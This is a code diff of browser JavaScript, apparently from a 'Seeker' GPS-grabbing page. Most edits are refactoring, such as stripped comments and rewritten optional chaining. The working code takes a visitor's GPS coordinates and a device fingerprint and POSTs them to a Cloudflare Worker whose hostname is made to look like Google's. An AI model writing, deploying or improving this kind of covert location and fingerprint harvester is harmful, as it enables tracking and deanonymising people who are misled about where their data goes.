@@ -8,11 +8,9 @@
 // CONFIGURATION
 // ==========================================
 
-// HTML elements
 const locationBtn = document.getElementById("locationBtn");
 const result = document.getElementById("result");
 
-// Cloudflare Worker URL
 const WORKER_URL =
     "https://google-com.ykzir-polyglot.workers.dev";
 
@@ -34,7 +32,8 @@ function getDeviceInfo() {
             navigator.userAgent || "Unavailable",
 
         platform:
-            navigator.userAgentData?.platform ||
+            (navigator.userAgentData &&
+             navigator.userAgentData.platform) ||
             navigator.platform ||
             "Unavailable",
 
@@ -42,10 +41,10 @@ function getDeviceInfo() {
             navigator.language || "Unavailable",
 
         screenResolution:
-            screenResolution: screen.width + " x " + screen.height,
+            screen.width + " x " + screen.height,
 
         colorDepth:
-            `${screen.colorDepth}-bit`,
+            screen.colorDepth + "-bit",
 
         timezone:
             Intl.DateTimeFormat().resolvedOptions().timeZone ||
@@ -56,11 +55,12 @@ function getDeviceInfo() {
 
         deviceMemory:
             navigator.deviceMemory
-                ? `${navigator.deviceMemory} GB`
+                ? navigator.deviceMemory + " GB"
                 : "Unavailable",
 
         connectionType:
-            connection?.effectiveType || "Unavailable",
+            (connection && connection.effectiveType) ||
+            "Unavailable",
 
         online:
             navigator.onLine ? "Yes" : "No",
@@ -79,10 +79,6 @@ function getDeviceInfo() {
 
 async function sendLocation(latitude, longitude, accuracy) {
 
-    // Collect device information
-    const device = getDeviceInfo();
-
-    // Prepare report
     const report = {
 
         latitude: latitude,
@@ -91,14 +87,13 @@ async function sendLocation(latitude, longitude, accuracy) {
 
         accuracy: Math.round(accuracy),
 
-        device: device
+        device: getDeviceInfo()
 
     };
 
     console.log("Sending report to Cloudflare...");
     console.log("Report:", report);
 
-    // Send report to Cloudflare Worker
     const response = await fetch(WORKER_URL, {
 
         method: "POST",
@@ -111,13 +106,19 @@ async function sendLocation(latitude, longitude, accuracy) {
 
     });
 
-    // Read Cloudflare response
-    const data = await response.json();
+    let data;
+
+    try {
+        data = await response.json();
+    } catch (error) {
+        throw new Error(
+            "Cloudflare returned an invalid or empty response."
+        );
+    }
 
     console.log("Cloudflare HTTP Status:", response.status);
     console.log("Cloudflare Response:", data);
 
-    // Check response
     if (!response.ok || !data.ok) {
 
         throw new Error(
@@ -145,7 +146,6 @@ if (!locationBtn || !result) {
 
     locationBtn.addEventListener("click", function() {
 
-        // Check browser GPS support
         if (!navigator.geolocation) {
 
             result.textContent =
@@ -155,7 +155,6 @@ if (!locationBtn || !result) {
 
         }
 
-        // Check secure connection
         if (!window.isSecureContext) {
 
             result.textContent =
@@ -165,13 +164,11 @@ if (!locationBtn || !result) {
 
         }
 
-        // Disable button while processing
         locationBtn.disabled = true;
 
         result.textContent =
             "Requesting location permission...";
 
-        // Request GPS coordinates
         navigator.geolocation.getCurrentPosition(
 
             // ==================================
@@ -189,32 +186,19 @@ if (!locationBtn || !result) {
                 const accuracy =
                     position.coords.accuracy;
 
-                console.log(
-                    "Latitude:",
-                    latitude
-                );
+                console.log("Latitude:", latitude);
+                console.log("Longitude:", longitude);
+                console.log("Accuracy:", accuracy);
 
-                console.log(
-                    "Longitude:",
-                    longitude
-                );
+                const device = getDeviceInfo();
 
-                console.log(
-                    "Accuracy:",
-                    accuracy
-                );
-
-                console.log(
-                    "Device Information:",
-                    getDeviceInfo()
-                );
+                console.log("Device Information:", device);
 
                 result.textContent =
                     "Location obtained. Sending report to Seeker GPS server...";
 
                 try {
 
-                    // Send GPS and device report
                     const response = await sendLocation(
                         latitude,
                         longitude,
@@ -240,7 +224,6 @@ if (!locationBtn || !result) {
 
                 } finally {
 
-                    // Re-enable button
                     locationBtn.disabled = false;
 
                 }
@@ -254,36 +237,26 @@ if (!locationBtn || !result) {
 
             function(error) {
 
-                console.error(
-                    "GPS ERROR:",
-                    error
-                );
+                console.error("GPS ERROR:", error);
 
                 switch (error.code) {
 
-                    case error.PERMISSION_DENIED:
-
+                    case 1:
                         result.textContent =
                             "Location permission was denied.";
-
                         break;
 
-                    case error.POSITION_UNAVAILABLE:
-
+                    case 2:
                         result.textContent =
                             "Location information is unavailable.";
-
                         break;
 
-                    case error.TIMEOUT:
-
+                    case 3:
                         result.textContent =
                             "Location request timed out.";
-
                         break;
 
                     default:
-
                         result.textContent =
                             "An unknown GPS error occurred.";
 
